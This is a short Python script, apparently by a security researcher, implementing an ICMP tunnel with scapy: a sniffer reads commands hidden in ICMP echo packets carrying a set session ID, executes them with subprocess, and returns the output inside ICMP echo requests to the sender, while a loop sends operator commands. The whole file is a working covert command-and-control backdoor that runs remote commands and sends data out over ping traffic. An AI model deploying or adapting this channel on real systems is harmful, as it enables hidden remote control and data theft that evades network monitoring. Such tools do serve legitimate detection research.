# Written by Hannah Cartier hcartier@activecountermeasures.com

from scapy.all import *
from multiprocessing import Process
import time, os, random
import subprocess
import string
import argparse
from commands import *

addr = ''
payload_len = 32  #MAX 1472 bytes
rand = False


def execute(packet):
    print("received command:")
    to_run = (packet[Raw].load).decode()
    print(to_run)
    output = subprocess.run(to_run, stdout=subprocess.PIPE, universal_newlines=True)
    print(type(output.stdout))
    icmp_send(packet[IP].src, output.stdout, RETURNED_DATA_SEQ)


def catch(packet):
    if packet[ICMP].id == SESSION_ID and packet[ICMP].type == 0:
        if packet[ICMP].seq == 99:
            print(packet[IP].src, ":", packet[Raw].load)
        else:
            execute(packet)

def snifff():
    print("Starting Server")
    sniff(prn=catch, filter="icmp", store="0")
'''
# function not currently in use
def send_random():
    _seq = 1
    while True:
        payload = ''.join(random.choice(string.ascii_lowercase) for _ in range(payload_len))
        icmp_send(payload)
'''

def icmp_send(addr, payload, sequence):
    send(IP(dst=addr)/ICMP(type="echo-request", id=SESSION_ID, seq=sequence)/payload)


if __name__ == "__main__":
    #print(hashtable)
    parser = argparse.ArgumentParser(description='Passer version ')
    parser.add_argument('-a', '--address', help='ip address to send packets too', required=False, default="127.0.0.1")
    parser.add_argument('-s', '--size', help='payload size for beacon', required=False, default=32)
    #parser.add_argument('-r', '--random', action='store_true', help='payload size for beacon', required=False, default=False)
    (parsed, unparsed) = parser.parse_known_args()
    args = vars(parsed)
    addr = args['address']
    sniffer = Process(target=snifff)
    sniffer.start()
    icmp_send(addr,'Hello From Client', FIRST_SEQ)
    sequence = 1
    while 1:
        response = input("\n> ")
        icmp_send(addr, response, sequence)
        sequence = (sequence + 1) % 128
